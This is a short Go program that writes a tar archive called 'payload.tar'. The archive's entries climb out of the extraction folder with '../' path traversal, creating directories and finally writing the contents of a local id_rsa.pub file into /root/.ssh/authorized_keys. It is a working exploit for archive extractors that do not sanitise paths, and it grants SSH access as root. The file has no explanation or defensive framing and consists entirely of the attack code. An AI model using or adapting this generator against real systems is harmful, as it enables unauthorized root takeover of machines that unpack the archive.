package main

import (
	"archive/tar"
	"fmt"
	"io/fs"
	"log"
	"os"
)

func main() {
	idrsa, err := os.ReadFile("id_rsa.pub")
	if err != nil {
		panic(err)
	}
	f, _ := os.Create("payload.tar")
	tw := tar.NewWriter(f)
	var files = []struct {
		Name string
		Mode fs.FileMode
		Body string
	}{
		{Name: "./test/", Mode: fs.ModeDir, Body: ""},
		{Name: "./test/../", Mode: fs.ModeDir, Body: ""},
		{Name: "./test/../../", Mode: fs.ModeDir, Body: ""},
		{Name: "./test/../../../", Mode: fs.ModeDir, Body: ""},
		{Name: "./test/../../../../", Mode: fs.ModeDir, Body: ""},
		{Name: "./test/../../../../root/", Mode: fs.ModeDir, Body: ""},
		{Name: "./test/../../../../root/.ssh/", Mode: fs.ModeDir, Body: ""},
		{Name: "./test/../../../../root/.ssh/authorized_keys", Mode: 0600, Body: string(idrsa)},
	}
	for _, file := range files {
		fmt.Printf("mode is %s", file.Mode)
		hdr := &tar.Header{
			Name: file.Name,
			Mode: int64(file.Mode),
			Size: int64(len(file.Body)),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			log.Fatal(err)
		}
		if _, err := tw.Write([]byte(file.Body)); err != nil {
			log.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		log.Fatal(err)
	}
}
